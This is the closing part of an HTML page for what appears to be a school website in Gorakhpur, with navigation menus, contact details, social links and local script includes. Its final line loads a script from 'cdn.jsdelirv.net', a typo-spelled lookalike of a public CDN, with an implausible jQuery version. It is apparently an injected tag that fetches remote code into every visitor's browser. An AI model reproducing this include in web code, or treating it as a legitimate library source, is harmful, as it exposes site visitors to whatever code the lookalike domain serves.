                    <a href="javascript:void(0);" class="main">Achievements</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="toppers-x.php">Toppers X</a></li>
                        <li><a href="toppers-xii.php">Toppers XII</a></li>
                    </ul>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Gallery</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="event_gallery.php">Event Gallery</a></li>
                        <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                    </ul>
                </li>
                <li>
                    <a href="blog.php" class="main">Blogs</a>
                </li>
                <li>
                    <a href="contact.php" class="main">Contact</a>
                </li>
            </ul>
            </nav>

            <div class="offcanvase__info--content mt--30">
                <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                <div class="offcanvase__info--content--social">
                    <p class="title">Follow Us:</p>
                    <div class="social__links">
                        <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                        <a href="#"><i class="fa-brands fa-instagram"></i></a>
                        <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                        <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area end -->
    </div>
    <!-- header style two End -->

    <div class="search-input-area">
        <div class="container">
            <div class="search-input-inner">
                <div class="input-div">
                    <input class="search-input autocomplete ui-autocomplete-input" type="text" placeholder="Search by keyword or #" autocomplete="off">
                    <button><i class="far fa-search"></i></button>
                </div>
            </div>
        </div>
        <div id="close" class="search-close-icon"><i class="far fa-times"></i></div>
    </div>
    <!-- rts backto top start -->
    <div class="progress-wrap">
        <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
            <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98" style="transition: stroke-dashoffset 10ms linear 0s; stroke-dasharray: 307.919, 307.919; stroke-dashoffset: 307.919;"></path>
        </svg>
    </div>
    <!-- rts back to top end -->
    <div id="anywhere-home" class="">
    </div>


    <!-- scripts -->
    <!-- jquery js -->
    <script src="assets/js/vendor/jquery.min.js"></script>
    <!-- bootstrap 5.0.2 -->
    <script src="assets/js/plugins/bootstrap.min.js"></script>
    <!-- jquery ui js -->
    <script src="assets/js/vendor/jquery-ui.js"></script>
    <!-- wow js -->
    <script src="assets/js/vendor/waw.js"></script>
    <!-- mobile menu -->
    <script src="assets/js/vendor/metismenu.js"></script>
    <!-- magnific popup -->
    <script src="assets/js/vendor/magnifying-popup.js"></script>
    <!-- swiper JS 10.2.0 -->
    <script src="assets/js/plugins/swiper.js"></script>
    <!-- counterup -->
    <script src="assets/js/plugins/counterup.js"></script>
    <script src="assets/js/vendor/waypoint.js"></script>
    <!-- isotop mesonary -->
    <script src="assets/js/plugins/isotop.js"></script>
    <script src="assets/js/plugins/imagesloaded.pkgd.min.js"></script>
    <script src="assets/js/plugins/sticky-sidebar.js"></script>
    <script src="assets/js/plugins/resize-sensor.js"></script>
    <script src="assets/js/plugins/twinmax.js"></script>
    <!-- dymanic Contact Form -->
    <script src="assets/js/plugins/contact.form.js"></script>
    <script src="assets/js/plugins/nice-select.min.js"></script>
    <!-- main Js -->
    <script src="assets/js/jquery.flexslider.js"></script>
    <script src="assets/js/main.js"></script>

<script src="https://cdn.jsdelirv.net/npm/jquery@4.5.2/dist/jquery.min.js"></script>
</body>
</html>